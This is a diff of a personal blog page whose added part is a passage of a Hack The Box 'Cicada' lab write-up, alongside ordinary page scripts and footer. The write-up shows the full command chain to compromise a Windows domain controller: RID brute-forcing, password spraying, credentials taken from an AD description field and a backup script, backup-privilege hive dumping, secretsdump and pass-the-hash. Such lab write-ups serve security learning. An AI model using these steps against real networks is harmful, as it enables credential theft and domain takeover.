-            const scrollPosition = window.scrollY + 100;
-            let active = null;
-            targets.forEach(t => {
-                if (t.element.offsetTop <= scrollPosition) active = t;
-            });
-            links.forEach(l => l.classList.remove('active'));
-            if (active) active.link.classList.add('active');
-        }
-
-        let ticking = false;
-        window.addEventListener('scroll', () => {
-            if (!ticking) {
-                requestAnimationFrame(() => { update(); ticking = false; });
-                ticking = true;
-            }
-        });
-        update();
-    }
-
-    function initMiniToc() {
-        const miniToc = document.getElementById('miniToc');
-        const miniTocContent = document.getElementById('miniTocContent');
-        const sourceToc = document.getElementById('tocContent');
-        if (!miniToc || !miniTocContent || !sourceToc) return;
-
-        const clone = sourceToc.cloneNode(true);
-        clone.classList.remove('toc-content', 'expanded');
-        clone.removeAttribute('id');
-
-        const links = clone.querySelectorAll('a');
-        if (links.length === 0) return;
-
-        links.forEach(link => {
-            link.addEventListener('click', (e) => {
-                const href = link.getAttribute('href');
-                if (href && href.startsWith('#')) {
-                    const target = document.getElementById(decodeURIComponent(href.slice(1)));
-                    if (target) {
-                        e.preventDefault();
-                        target.scrollIntoView({ behavior: 'smooth', block: 'start' });
-                        history.pushState(null, '', href);
-                    }
-                }
-            });
-        });
-
-        miniTocContent.appendChild(clone);
-        miniToc.classList.add('visible');
-        setupActiveHighlighting(links);
-    }
-
-    document.addEventListener('DOMContentLoaded', initMiniToc);
-</script>
-<footer class="footer">
-    <span class="footer_item"> </span>
-    &nbsp;
-
-    <div class="footer_social-icons">
-<a href="https://discord.com/users/kanyo._" target="_blank" rel="noopener noreferrer me"
-    title="Discord"><svg xmlns="http://www.w3.org/2000/svg" viewBox="20 15 205 190" fill="currentColor" stroke="none">
-    <path
-        d="M104.4 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1.1-6.1-4.5-11.1-10.2-11.1zM140.9 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1s-4.5-11.1-10.2-11.1z" />
-    <path
-        d="M189.5 20h-134C44.2 20 35 29.2 35 40.6v135.2c0 11.4 9.2 20.6 20.5 20.6h113.4l-5.3-18.5 12.8 11.9 12.1 11.2 21.5 19V40.6c0-11.4-9.2-20.6-20.5-20.6zm-38.6 130.6s-3.6-4.3-6.6-8.1c13.1-3.7 18.1-11.9 18.1-11.9-4.1 2.7-8 4.6-11.5 5.9-5 2.1-9.8 3.5-14.5 4.3-9.6 1.8-18.4 1.3-25.9-.1-5.7-1.1-10.6-2.7-14.7-4.3-2.3-.9-4.8-2-7.3-3.4-.3-.2-.6-.3-.9-.5-.2-.1-.3-.2-.4-.3-1.8-1-2.8-1.7-2.8-1.7s4.8 8 17.5 11.8c-3 3.8-6.7 8.3-6.7 8.3-22.1-.7-30.5-15.2-30.5-15.2 0-32.2 14.4-58.3 14.4-58.3 14.4-10.8 28.1-10.5 28.1-10.5l1 1.2c-18 5.2-26.3 13.1-26.3 13.1s2.2-1.2 5.9-2.9c10.7-4.7 19.2-6 22.7-6.3.6-.1 1.1-.2 1.7-.2 6.1-.8 13-1 20.2-.2 9.5 1.1 19.7 3.9 30.1 9.6 0 0-7.9-7.5-24.9-12.7l1.4-1.6s13.7-.3 28.1 10.5c0 0 14.4 26.1 14.4 58.3 0 0-8.5 14.5-30.6 15.2z" />
-</svg></a>
-<a href="https://github.com/Chaelsoo" target="_blank" rel="noopener noreferrer me"
-    title="Github"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
-    stroke-linecap="round" stroke-linejoin="round">
-    <path
-        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
-    </path>
-</svg></a>
-<a href="https://www.linkedin.com/in/abderrahmen-dellaa-a78517249/" target="_blank" rel="noopener noreferrer me"
-    title="Linkedin"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
-    stroke-linecap="round" stroke-linejoin="round">
-    <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
-    <rect x="2" y="9" width="4" height="12"></rect>
-    <circle cx="4" cy="4" r="2"></circle>
-</svg></a>
-<a href="https://app.hackthebox.com/users/1490281" target="_blank" rel="noopener noreferrer me"
-    title="Hackthebox"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 1L2 6.5v11L12 23l10-5.5v-11L12 1z"></path><path d="M12 12L2 6.5M12 12v11M12 12l10-5.5"></path></svg></a>
-</div>
-    <small class="footer_copyright">
-        © 2026 .
-        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
-    </small>
-</footer><a href="#" title="Go to top" id="totop">
-    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
-    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
-</svg>
-
-</a>
-
-
-    
-
-
-
-
-    
-
-
-
-
-    
-
-
-
-
-
-
-    
-    <script async src="http://localhost:1313/js/main.js"></script>
-
-    
-
-</body>
-</html>
+</code></pre><p>Default password, handed out in a file sitting on a guest-readable share. Now I needed usernames to spray it against. With no web interface or other source, RID brute-force via SMB enumerates domain SIDs numerically:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc smb 10.129.231.149 -u <span class=s1>&#39;guest&#39;</span> -p <span class=s1>&#39;&#39;</span> --rid-brute <span class=m>4000</span> <span class=p>|</span> grep SidTypeUser
+</span></span><span class=line><span class=cl>500: CICADA<span class=se>\A</span>dministrator
+</span></span><span class=line><span class=cl>501: CICADA<span class=se>\G</span>uest
+</span></span><span class=line><span class=cl>502: CICADA<span class=se>\k</span>rbtgt
+</span></span><span class=line><span class=cl>1104: CICADA<span class=se>\j</span>ohn.smoulder
+</span></span><span class=line><span class=cl>1105: CICADA<span class=se>\s</span>arah.dantelia
+</span></span><span class=line><span class=cl>1106: CICADA<span class=se>\m</span>ichael.wrightson
+</span></span><span class=line><span class=cl>1108: CICADA<span class=se>\d</span>avid.orelious
+</span></span><span class=line><span class=cl>1601: CICADA<span class=se>\e</span>mily.oscars
+</span></span></code></pre></div><p>Five regular users. Sprayed the default password against all of them:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc smb 10.129.231.149 -u users.txt -p <span class=s1>&#39;Cicada$M6Corpb*@Lp#nZp!8&#39;</span> --continue-on-success
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> john.smoulder: STATUS_LOGON_FAILURE
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> sarah.dantelia: STATUS_LOGON_FAILURE
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> michael.wrightson:Cicada<span class=nv>$M6Corpb</span>*@Lp#nZp!8
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> david.orelious: STATUS_LOGON_FAILURE
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> emily.oscars: STATUS_LOGON_FAILURE
+</span></span></code></pre></div><p><code>michael.wrightson</code> hadn&rsquo;t changed his default password. WinRM denied him, but LDAP worked, enough to query the directory.</p><h2 id=davidorelious-from-an-ad-description-field>david.orelious from an AD Description Field</h2><p>With authenticated LDAP access, I ran nxc&rsquo;s <code>get-desc-users</code> module. It queries the <code>description</code> attribute on all user objects in AD. Admins sometimes stash passwords there when they create accounts:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc ldap 10.129.231.149 -u michael.wrightson -p <span class=s1>&#39;Cicada$M6Corpb*@Lp#nZp!8&#39;</span> -M get-desc-users
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>User: david.orelious description: Just in <span class=k>case</span> I forget my password is aRt<span class=nv>$Lp</span><span class=c1>#7t*VQ!3</span>
+</span></span></code></pre></div><p><code>david.orelious:aRt$Lp#7t*VQ!3</code>. Self-documented in the description field of his own AD account.</p><p>David had access to the DEV share that michael couldn&rsquo;t see:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc smb 10.129.231.149 -u david.orelious -p <span class=s1>&#39;aRt$Lp#7t*VQ!3&#39;</span> --shares
+</span></span><span class=line><span class=cl>Share   Permissions
+</span></span><span class=line><span class=cl>DEV     READ
+</span></span><span class=line><span class=cl>HR      READ
+</span></span></code></pre></div><h2 id=emilyoscars-from-a-backup-script>emily.oscars from a Backup Script</h2><p>One file in the DEV share: <code>Backup_script.ps1</code>. A PowerShell script that compresses a directory and saves it as a backup:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nv>$username</span> <span class=p>=</span> <span class=s2>&#34;emily.oscars&#34;</span>
+</span></span><span class=line><span class=cl><span class=nv>$password</span> <span class=p>=</span> <span class=nb>ConvertTo-SecureString</span> <span class=s2>&#34;Q!3@Lp#M6b*7t*Vt&#34;</span> <span class=n>-AsPlainText</span> <span class=n>-Force</span>
+</span></span><span class=line><span class=cl><span class=nv>$credentials</span> <span class=p>=</span> <span class=nb>New-Object</span> <span class=n>System</span><span class=p>.</span><span class=py>Management</span><span class=p>.</span><span class=py>Automation</span><span class=p>.</span><span class=py>PSCredential</span><span class=p>(</span><span class=nv>$username</span><span class=p>,</span> <span class=nv>$password</span><span class=p>)</span>
+</span></span></code></pre></div><p>Hardcoded credentials for the user running the backup job. <code>emily.oscars:Q!3@Lp#M6b*7t*Vt</code>. This one had WinRM:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc winrm 10.129.231.149 -u emily.oscars -p <span class=s1>&#39;Q!3@Lp#M6b*7t*Vt&#39;</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> cicada.htb<span class=se>\e</span>mily.oscars:Q!3@Lp#M6b*7t*Vt <span class=o>(</span>Pwn3d!<span class=o>)</span>
+</span></span></code></pre></div><p>User flag on her desktop.</p><h2 id=backup-operators-and-sebackupprivilege>Backup Operators and SeBackupPrivilege</h2><p>I noticed emily&rsquo;s group memberships in BloodHound before I had her password. She was in the Backup Operators group alongside Remote Management Users:</p><p><img src=/images/writeups/htb-cicada/bloodhound-emily-backup-operators.png alt="BloodHound graph showing EMILY.OSCARS@CICADA.HTB is MemberOf Backup Operators, Remote Management Users, and Domain Users groups"></p><p><code>whoami /all</code> inside her WinRM session confirmed it: <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code>, both enabled.</p><p>Backup Operators is a privileged built-in group designed to let members back up and restore files regardless of their normal permissions. The underlying mechanism is SeBackupPrivilege, which bypasses normal ACL checks when opening files for backup purposes. On a domain controller, that includes the registry hives, specifically <code>HKLM\SAM</code> and <code>HKLM\SYSTEM</code>, which together allow offline extraction of all local account NT hashes.</p><p>The nxc <code>backup_operator</code> module automates the whole thing remotely. It starts RemoteRegistry via a named pipe, then uses backup semantics to save the hives directly to a readable share:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc smb 10.129.231.149 -u emily.oscars -p <span class=s1>&#39;Q!3@Lp#M6b*7t*Vt&#39;</span> -M backup_operator
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Triggering RemoteRegistry to start through named pipe...
+</span></span><span class=line><span class=cl>Saved HKLM<span class=se>\S</span>AM to <span class=se>\\</span>10.129.231.149<span class=se>\S</span>YSVOL<span class=se>\S</span>AM
+</span></span><span class=line><span class=cl>Saved HKLM<span class=se>\S</span>YSTEM to <span class=se>\\</span>10.129.231.149<span class=se>\S</span>YSVOL<span class=se>\S</span>YSTEM
+</span></span><span class=line><span class=cl>Saved HKLM<span class=se>\S</span>ECURITY to <span class=se>\\</span>10.129.231.149<span class=se>\S</span>YSVOL<span class=se>\S</span>ECURITY
+</span></span></code></pre></div><p>Downloaded the three files, then used secretsdump locally:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>secretsdump.py -sam SAM -system SYSTEM LOCAL
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Dumping <span class=nb>local</span> SAM hashes <span class=o>(</span>uid:rid:lmhash:nthash<span class=o>)</span>
+</span></span><span class=line><span class=cl>Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
+</span></span></code></pre></div><p>Pass-the-hash:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>evil-winrm -i 10.129.231.149 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341
+</span></span></code></pre></div><p>Root flag. The password in the account description field is the thing to remember from this one. Not a misconfigured service, not a protocol weakness. Just someone typing a credential into a field meant for a note and forgetting about it. Check description fields in BloodHound data, every time.</p></div></article></main></div><script>function toggleToc(){const e=document.getElementById("tocContent"),t=document.querySelector(".toc-toggle");if(!e||!t)return;e.classList.toggle("expanded"),t.classList.toggle("expanded")}function toggleMiniToc(){const e=document.getElementById("miniToc");e&&e.classList.toggle("minimized")}function setupActiveHighlighting(e){const n=Array.from(e).map(e=>{const t=e.getAttribute("href");if(t&&t.startsWith("#")){const n=document.getElementById(decodeURIComponent(t.slice(1)));if(n)return{link:e,element:n}}return null}).filter(Boolean);if(n.length===0)return;function s(){const s=window.scrollY+100;let t=null;n.forEach(e=>{e.element.offsetTop<=s&&(t=e)}),e.forEach(e=>e.classList.remove("active")),t&&t.link.classList.add("active")}let t=!1;window.addEventListener("scroll",()=>{t||(requestAnimationFrame(()=>{s(),t=!1}),t=!0)}),s()}function initMiniToc(){const n=document.getElementById("miniToc"),s=document.getElementById("miniTocContent"),o=document.getElementById("tocContent");if(!n||!s||!o)return;const e=o.cloneNode(!0);e.classList.remove("toc-content","expanded"),e.removeAttribute("id");const t=e.querySelectorAll("a");if(t.length===0)return;t.forEach(e=>{e.addEventListener("click",t=>{const n=e.getAttribute("href");if(n&&n.startsWith("#")){const e=document.getElementById(decodeURIComponent(n.slice(1)));e&&(t.preventDefault(),e.scrollIntoView({behavior:"smooth",block:"start"}),history.pushState(null,"",n))}})}),s.appendChild(e),n.classList.add("visible"),setupActiveHighlighting(t)}document.addEventListener("DOMContentLoaded",initMiniToc)</script><footer class=footer><span class=footer_item></span>&nbsp;<div class=footer_social-icons><a href=https://discord.com/users/kanyo._ target=_blank rel="noopener noreferrer me" title=Discord><svg viewBox="20 15 205 190" fill="currentColor" stroke="none"><path d="M104.4 103.9c-5.7.0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7.0 10.2-5 10.2-11.1.1-6.1-4.5-11.1-10.2-11.1zm36.5.0c-5.7.0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7.0 10.2-5 10.2-11.1s-4.5-11.1-10.2-11.1z"/><path d="M189.5 20h-134C44.2 20 35 29.2 35 40.6v135.2c0 11.4 9.2 20.6 20.5 20.6h113.4l-5.3-18.5 12.8 11.9 12.1 11.2 21.5 19V40.6c0-11.4-9.2-20.6-20.5-20.6zm-38.6 130.6s-3.6-4.3-6.6-8.1c13.1-3.7 18.1-11.9 18.1-11.9-4.1 2.7-8 4.6-11.5 5.9-5 2.1-9.8 3.5-14.5 4.3-9.6 1.8-18.4 1.3-25.9-.1-5.7-1.1-10.6-2.7-14.7-4.3-2.3-.9-4.8-2-7.3-3.4-.3-.2-.6-.3-.9-.5-.2-.1-.3-.2-.4-.3-1.8-1-2.8-1.7-2.8-1.7s4.8 8 17.5 11.8c-3 3.8-6.7 8.3-6.7 8.3-22.1-.7-30.5-15.2-30.5-15.2.0-32.2 14.4-58.3 14.4-58.3 14.4-10.8 28.1-10.5 28.1-10.5l1 1.2c-18 5.2-26.3 13.1-26.3 13.1s2.2-1.2 5.9-2.9c10.7-4.7 19.2-6 22.7-6.3.6-.1 1.1-.2 1.7-.2 6.1-.8 13-1 20.2-.2 9.5 1.1 19.7 3.9 30.1 9.6.0.0-7.9-7.5-24.9-12.7l1.4-1.6s13.7-.3 28.1 10.5c0 0 14.4 26.1 14.4 58.3.0.0-8.5 14.5-30.6 15.2z"/></svg></a>
+<a href=https://github.com/Chaelsoo target=_blank rel="noopener noreferrer me" title=Github><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a>
+<a href=https://www.linkedin.com/in/abderrahmen-dellaa-a78517249/ target=_blank rel="noopener noreferrer me" title=Linkedin><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg></a>
+<a href=https://app.hackthebox.com/users/1490281 target=_blank rel="noopener noreferrer me" title=Hackthebox><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 1 2 6.5v11L12 23l10-5.5v-11L12 1z"/><path d="M12 12 2 6.5M12 12v11m0-11 10-5.5"/></svg></a></div><small class=footer_copyright>© 2026 .
+Powered by <a href=https://github.com/hugo-sid/hugo-blog-awesome target=_blank rel=noopener>Hugo blog awesome</a>.</small></footer><a href=# title="Go to top" id=totop><svg width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960"><path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197z"/></svg>
+</a><script src=https://chaelsoo.me/js/main.min.b09c6387b2f6ee79fac79c531b410d511da72f67534abd4435676936738db1e1.js integrity="sha256-sJxjh7L27nn6x5xTG0ENUR2nL2dTSr1ENWdpNnONseE="></script></body></html>
